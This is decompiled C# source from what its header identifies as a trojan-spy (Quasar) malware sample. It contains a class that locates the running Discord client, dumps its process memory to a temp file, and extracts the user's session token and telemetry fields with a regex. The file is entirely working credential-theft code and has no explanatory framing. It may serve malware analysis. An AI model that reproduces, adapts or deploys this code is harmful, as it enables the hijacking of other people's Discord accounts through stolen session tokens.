// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Recovery.fffsa
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace NoiseMe.Drags.App.Data.Recovery
{
  public static class fffsa
  {
    private static Regex regex = new Regex("({\"token\":\"(.*)}}]})", RegexOptions.Compiled);

    [DllImport("DbgHelp.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool MiniDumpWriteDump(
      IntPtr hProcess,
      int ProcessId,
      IntPtr hFile,
      uint DumpType,
      IntPtr ExceptionParam,
      IntPtr UserStreamParam,
      IntPtr CallbackParam);

    public static DiscordSession TempGet()
    {
      try
      {
        Process disordProcess = fffsa.FindDisordProcess();
        if (disordProcess != null)
        {
          string data = fffsa.DumpProcess(disordProcess);
          if (!string.IsNullOrEmpty(data))
          {
            string discordJsonSession = fffsa.FindDiscordJsonSession(data);
            if (!string.IsNullOrEmpty(discordJsonSession))
            {
              JsonValue jsonValue1 = discordJsonSession.FromJSON();
              DiscordSession discordSession = new DiscordSession();
              discordSession.token = jsonValue1["token"].ToString(false);
              discordSession.events = new List<Event>();
              foreach (JsonValue jsonValue2 in (IEnumerable) jsonValue1["events"])
              {
                Event @event = new Event()
                {
                  type = jsonValue2["type"].ToString(false)
                };
                foreach (JsonValue jsonValue3 in (IEnumerable) jsonValue2["properties"])
                {
                  @event.properties = new Properties();
                  @event.properties.client_send_timestamp = jsonValue3["client_send_timestamp"].ToString(false);
                  @event.properties.client_track_timestamp = jsonValue3["client_track_timestamp"].ToString(false);
                  @event.properties.client_uuid = jsonValue3["client_uuid"].ToString(false);
                  @event.properties.num_users_visible = Convert.ToInt32(jsonValue3["num_users_visible"].ToString(false));
                  @event.properties.num_users_visible_with_mobile_indicator = Convert.ToInt32(jsonValue3["num_users_visible_with_mobile_indicator"].ToString(false));
                }
                discordSession.events.Add(@event);
              }
              return discordSession;
            }
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      return (DiscordSession) null;
    }

    private static string FindDiscordJsonSession(string data)
    {
      try
      {
        IEnumerator enumerator = fffsa.regex.Matches(data).GetEnumerator();
        try
        {
          if (enumerator.MoveNext())
            return ((Capture) enumerator.Current).Value;
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            disposable.Dispose();
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      return string.Empty;
    }

    private static string DumpProcess(Process process)
    {
      string empty = string.Empty;
      try
      {
        string path = Environment.ExpandEnvironmentVariables(Path.Combine("%temp%", "discord.dmp"));
        bool flag = false;
        using (FileStream fileStream = File.Open(path, FileMode.Create, FileAccess.Write))
          flag = fffsa.MiniDumpWriteDump(process.Handle, process.Id, fileStream.SafeFileHandle.DangerousGetHandle(), 2U, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (flag)
          return File.ReadAllText(path);
      }
      catch
      {
      }
      return empty;
    }

    private static Process FindDisordProcess()
    {
      try
      {
        foreach (Process process in Process.GetProcessesByName("Discord"))
        {
          if (ClientInfoHelper.GetCommandLine(process).Trim() == "\"" + process.MainModule.FileName + "\"")
            return process;
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      return (Process) null;
    }
  }
}
